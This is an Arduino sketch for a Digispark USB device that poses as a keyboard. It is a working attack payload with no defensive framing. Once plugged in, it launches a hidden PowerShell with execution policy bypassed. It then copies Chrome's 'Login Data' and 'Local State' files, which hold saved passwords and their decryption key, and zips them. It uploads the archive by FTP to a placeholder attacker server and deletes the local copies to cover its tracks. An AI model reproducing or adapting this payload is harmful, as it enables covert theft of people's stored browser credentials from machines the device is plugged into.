#include "DigiKeyboard.h"
void setup() {
    pinMode(1, OUTPUT);
}

  char mode[] = "powershell -nop -win h -noni -exec bypass";
  char separator[] = "exit";

void loop() {
      digitalWrite(1, HIGH); // Turn on the red LED
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.print(mode);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
	DigiKeyboard.delay(500);
  DigiKeyboard.print(" mkdir D:\\browsercredentials");
	DigiKeyboard.sendKeyStroke(KEY_ENTER);
	DigiKeyboard.delay(600);
	DigiKeyboard.print("cd AppData\\Local\\Google\\chrome\\'User Data'");
	DigiKeyboard.sendKeyStroke(KEY_ENTER);
	DigiKeyboard.delay(600);
	DigiKeyboard.print("copy 'Local State' D:\\browsercredentials\\");
	DigiKeyboard.sendKeyStroke(KEY_ENTER);
	DigiKeyboard.delay(600);
	DigiKeyboard.print("copy Default\\'Login Data' D:\\browsercredentials");
	DigiKeyboard.sendKeyStroke(KEY_ENTER);
	DigiKeyboard.delay(600);
	DigiKeyboard.print("cd D:\\");
	DigiKeyboard.sendKeyStroke(KEY_ENTER);
	DigiKeyboard.delay(600);
	DigiKeyboard.print("Compress-Archive browsercredentials browsercredentials.zip");
	DigiKeyboard.sendKeyStroke(KEY_ENTER);
	DigiKeyboard.delay(1500);
  DigiKeyboard.print("ftp {ip_address}"); //accessing ftp server
  DigiKeyboard.delay(600);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(600);
  DigiKeyboard.print("username"); // username of ftp
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(600);
  DigiKeyboard.print("password"); //password of ftp
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(600);
  DigiKeyboard.print("cd Desktop"); // ftp directory in which you want to copy the files 
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(600);
  DigiKeyboard.print("prompt"); 
  DigiKeyboard.delay(600);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.print("put browsercredentials.zip");
  DigiKeyboard.delay(600);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(600);
  DigiKeyboard.print("bye");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(600);
  DigiKeyboard.print("del browsercredentials");
  DigiKeyboard.delay(600);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.print("y"); 
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.print("del browsercredentials.zip");
  DigiKeyboard.delay(600);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.print("exit");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(5000);
  for(;;){ }
}
